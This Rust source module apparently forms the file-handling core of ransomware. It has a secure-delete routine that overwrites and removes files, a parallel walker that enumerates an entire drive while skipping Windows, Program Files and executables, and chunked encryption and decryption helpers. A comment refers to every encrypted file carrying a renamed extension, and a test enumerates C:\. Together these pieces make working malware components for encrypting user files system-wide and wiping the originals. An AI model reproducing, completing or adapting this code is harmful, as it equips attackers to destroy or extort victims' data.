use std::collections::HashSet;
use std::error::Error;
use std::path::{Path, PathBuf};
use std::io::{Error as ErrorIO, ErrorKind, Read, Seek, SeekFrom, Write};
use std::fs::{self, OpenOptions};
use std::sync::mpsc;
use std::thread;

use rand::Rng;

use ignore::{WalkBuilder, WalkState};

use crate::crypt::{TAG_LEN, encrypt_data, decrypt_data};
use crate::WRITE_FILE_CHUNK_SIZE;

pub fn secure_delete_file(file_path: &PathBuf, passes: usize) -> Result<(), ErrorIO> {
    let mut rng = rand::thread_rng();

    let mut file = OpenOptions::new()
        .write(true)
        .open(&file_path)?;

    let mut buffer = [0u8; WRITE_FILE_CHUNK_SIZE];

    let file_size = file
        .metadata()?
        .len() as usize;

    for pass in 0 .. passes {
        file.seek(SeekFrom::Start(0))?;

        let mut need_to_write = file_size;
        while need_to_write > 0 {
            let chunk_size = need_to_write.min(WRITE_FILE_CHUNK_SIZE);

            match pass % 3 {
                0 => buffer[..chunk_size].fill(0x00),
                1 => buffer[..chunk_size].fill(0xFF),
                _ => rng.fill(&mut buffer[..chunk_size])
            };

            file.write_all(&mut buffer[..chunk_size])?;

            need_to_write -= chunk_size;
        }
    }

    file.set_len(0)?;
    file.sync_data()?;

    drop(file);

    fs::remove_file(&file_path)?;

    Ok(())
}

pub fn enumerate_files<F>(
    dir_path: &PathBuf,
    chunk_size: usize,
    ignored_directories: &[String],
    ignored_file_extensions: &[String],
    ignored_file_names: &[String],
    invert_ignored_extensions: bool,
    callback: F,
) where F: Fn(&[PathBuf]) + Send + Sync {
    let ignored_dir_components = ignored_directories
        .iter()
        .map(|dir| {
            Path::new(dir)
                .components()
                .filter_map(|comp| comp.as_os_str().to_str())
                .map(|str| str.to_lowercase())
                .collect()
        })
        .collect::<Vec<Vec<String>>>();

    let ignored_ext_set = ignored_file_extensions
        .iter()
        .map(|str| str.as_str())
        .collect::<HashSet<&str>>();

    let ignored_name_set = ignored_file_names
        .iter()
        .map(|str| str.as_str())
        .collect::<HashSet<&str>>();

    let (sender, receiver) = mpsc::sync_channel::<PathBuf>(chunk_size * 8);

    thread::scope(|scope| {
        scope.spawn(|| {
            let send_walker = sender.clone();
            drop(sender);

            WalkBuilder::new(dir_path)
                .git_ignore(false)
                .git_global(false)
                .git_exclude(false)
                .hidden(false)
                .build_parallel()
                .run(|| {
                    let sender = send_walker.clone();

                    let ignored_dir_components = &ignored_dir_components;
                    let ignored_ext_set = &ignored_ext_set;
                    let ignored_name_set = &ignored_name_set;

                    Box::new(move |entry| {
                        let Ok(entry) = entry else {
                            return WalkState::Continue;
                        };

                        let Some(file_type) = entry.file_type() else {
                            return WalkState::Continue;
                        };

                        let path = entry.path();

                        if file_type.is_dir() {
                            let path_components = path
                                .components()
                                .filter_map(|comp| comp.as_os_str().to_str())
                                .map(|str| str.to_lowercase())
                                .collect::<Vec<String>>();

                            let should_ignore = ignored_dir_components.iter().any(|ignore| {
                                path_components
                                    .windows(ignore.len())
                                    .any(|window| window == ignore.as_slice())
                            });

                            if should_ignore {
                                return WalkState::Skip;
                            }

                            return WalkState::Continue;
                        }

                        if !file_type.is_file() {
                            return WalkState::Continue;
                        }

                        if let Some(file_name) = path.file_name() {
                            let file_name_str = file_name
                                .to_str()
                                .unwrap_or("");

                            if ignored_name_set.contains(file_name_str) {
                                return WalkState::Continue;
                            }
                        }

                        if let Some(extention) = path.extension() {
                            let extention_str = extention
                                .to_str()
                                .unwrap_or("");

                            if ignored_ext_set.contains(extention_str) {
                                // when we are decrypting and we know that the
                                // file extension has been renamed, we can just
                                // only target the files with that specific extension
                                // since we know every encrypted file is going
                                // to have that extension
                                //
                                // it is also faster than checking if each file
                                // has a valid header or decrypting it only for
                                // the decryption to fail
                                if invert_ignored_extensions {
                                    sender
                                        .send(path.to_path_buf())
                                        .ok();
                                }

                                return WalkState::Continue;
                            }
                        }

                        sender
                            .send(path.to_path_buf())
                            .ok();

                        WalkState::Continue
                    })
                });
        });

        let mut files = Vec::with_capacity(chunk_size);

        for path in receiver {
            files.push(path);

            if files.len() >= chunk_size {
                callback(&files);
                files.clear();
            }
        }

        if !files.is_empty() {
            callback(&files);
        }
    });
}

pub fn write_encrypt_chunks(
    reader: &mut impl Read,
    writer: &mut impl Write,
    key: &[u8],
    chunk_count: usize
) -> Result<(), Box<dyn Error>> {
    let mut buffer = vec![0u8; WRITE_FILE_CHUNK_SIZE];

    let mut chunks_written = 0;
    while chunks_written < chunk_count {
        let bytes_read = read_chunk(reader, &mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        let encrypted = encrypt_data(&buffer[..bytes_read], key)
            .map_err(|err| err.to_string())?;

        writer.write_all(&encrypted)?;

        chunks_written += 1;
    }

    Ok(())
}

pub fn read_decrypt_chunks(
    reader: &mut impl Read,
    writer: &mut impl Write,
    key: &[u8],
    chunk_count: usize
) -> Result<(), Box<dyn Error>> {
    for _ in 0..chunk_count {
        let mut buffer = vec![0u8; WRITE_FILE_CHUNK_SIZE + TAG_LEN];

        let bytes_read = read_chunk(reader, &mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        let decrypted = decrypt_data(&buffer[..bytes_read], key)
            .map_err(|err| err.to_string())?;

        writer.write_all(&decrypted)?;
    }

    Ok(())
}


fn read_chunk(reader: &mut impl Read, buffer: &mut [u8]) -> Result<usize, Box<dyn Error>> {
    let mut total = 0;

    while total < buffer.len() {
        match reader.read(&mut buffer[total..]) {
            Ok(0) => break,
            Ok(data) => total += data,
            Err(err) if err.kind() == ErrorKind::Interrupted => continue,
            Err(err) => return Err(err.into())
        }
    }

    Ok(total)
}

#[test]
fn test_enumerate_files() {
    use std::io;
    use std::time::Instant;

    const ROOT_DIR: &str = "C:\\";

    let mut ignored_dirs = Vec::with_capacity(5);
    ignored_dirs.push("$Recycle.Bin".to_string());
    ignored_dirs.push("C:\\DRIVER".to_string());
    ignored_dirs.push("C:\\Windows".to_string());
    ignored_dirs.push("C:\\Program Files".to_string());
    ignored_dirs.push("C:\\Program Files (x86)".to_string());

    let mut ignored_exts = Vec::with_capacity(3);
    ignored_exts.push("$sys".to_string());
    ignored_exts.push("exe".to_string());
    ignored_exts.push("dll".to_string());

    let mut ignored_names = Vec::with_capacity(1);
    ignored_names.push("desktop.ini".to_string());

    let start = Instant::now();

    enumerate_files(
        &PathBuf::from(ROOT_DIR),
        300,
        &ignored_dirs,
        &ignored_exts,
        &ignored_names,
        false,
        |files| {
            let stdout = io::stdout();
            let mut lock = stdout.lock();

            for file in files {
                writeln!(lock, "{}", file.display()).ok();
            }
        }
    );

    println!("\nenumeration done in {:?}", start.elapsed());
}
